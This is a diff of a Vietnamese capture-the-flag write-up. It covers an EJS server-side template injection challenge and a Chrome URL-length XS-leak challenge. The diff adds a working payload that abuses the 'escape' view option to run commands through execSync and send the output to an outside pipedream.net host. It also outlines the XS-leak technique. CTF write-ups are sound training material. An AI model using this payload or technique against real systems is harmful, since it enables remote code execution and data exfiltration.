@@ -1,5 +1,7 @@
 ## Express JavaScript Security
+
 <img width="806" alt="Untitled" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/2e1e56bb-c804-409e-a6a4-aacd3f5b07b1">
+
 Đầu tiên, ta cùng nhìn sơ qua challenge:
 - Để đọc flag ta cần RCE được web để chạy file `/readflag` lấy flag.
 ```Dockerfile
@@ -31,6 +33,8 @@ USER ejs
 ENTRYPOINT ["/usr/bin/dumb-init", "--"]
 CMD ["node", "./main.js"]
 ```
+
+Bài này nhắm đến việc lợi dụng lỗ hổng Server side template injection trong `settings[view options]` của `ejs`.
 
 ```js
 const express = require('express');
@@ -69,10 +73,31 @@ app.listen(3000, () => {
     console.log('Server listening on port 3000')
 })
 ```
-## MANDATORY NOTES
-Trong thời gian diễn ra giải thì mình đang bận bịu với đồ án mật mã học nên cũng chưa có thời gian để xem kĩ bài này.
+Có 5 options có thể gây ra RCE bao gồm: `outputFunctionName`, `escapeFunction`, `escape`, `localsName`, `destructuredLocals`. Bài đã filter 4 cái còn lại mỗi `escape`, để có thể trigger được escape, ta cần điều kiện là option client không null (Đọc code để biết thêm, mình lười lục lại wa).
 
-Thực chất ý tưởng của bài này khá là dễ, đọc qua là đã biết xsleak rồi.
+Payload:
+```
+/greet?name=ehehhee&font=Arial&fontSize=20&settings[view%20options][client]=notempty&settings[view%20options][escape]=JSON.stringify;console.log(global.process.mainModule.require('http').get('http://eov5gzrmq5p9826.m.pipedream.net',%20{headers:%20{'User-Agent':global.process.mainModule.require('child_process').execSync('/readflag').toString('base64')}}))&debug=true
+```
+
+Exploit:
+
+<img width="805" alt="image" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/a8c07e95-ccc8-48d1-a5fa-1bba04d50d54">
+
+Flag:
+
+<img width="535" alt="Screenshot 2023-08-25 170601" src="https://github.com/rayinaw/ctf-challenges/assets/108481122/8b30ea74-49b6-41eb-ab60-fce85a4864f8">
+
+Link research:
+- https://kerupuksambel.medium.com/pwn2win-2021-ctf-writeup-illusion-88f6c7737de3
+- https://kerupuksambel.medium.com/pwn2win-2021-ctf-writeup-illusion-88f6c7737de3
+- https://jorgectf.github.io/blog/post/finding-prototype-pollution-gadgets-with-codeql/
+
+Khi debug ở máy, nên bật debug=true để xem nội dung src được chèn.
+
+## MANDATORY NOTES
+
+Một bài xsleak ý tưởng từ max url length của chrome, khá là hay nên mình làm lại sau giải.
 
 ```js
 const express = require('express');
@@ -168,6 +193,7 @@ fetch('/notes')
 ```
 
 Hành động của admin bot:
+
 ```js
 import puppeteer from 'puppeteer'
 import express from 'express'
@@ -247,6 +273,6 @@ app.listen(port, async () => {
 Set flag vào note và visit đến site mà ta đưa vào.
 
 Ý tưởng: Lợi dụng URL limit 2MB trong Chrome
-- Làm cho để độ dài khi query nhỏ hơn 2MB, do đó khi điều hướng đến ?found=0 với phần fragment sẽ vừa đủ 2MB và gây ra `about:blank#block`
+- Làm cho độ dài khi query nhỏ hơn 2MB, do đó khi điều hướng đến ?found=0 với phần fragment sẽ vừa đủ 2MB và gây ra `about:blank#block`
 - Nếu tìm kiếm có thì fragment mới sẽ thay phần `#AAA...AAA` nên sẽ không aborted.
 
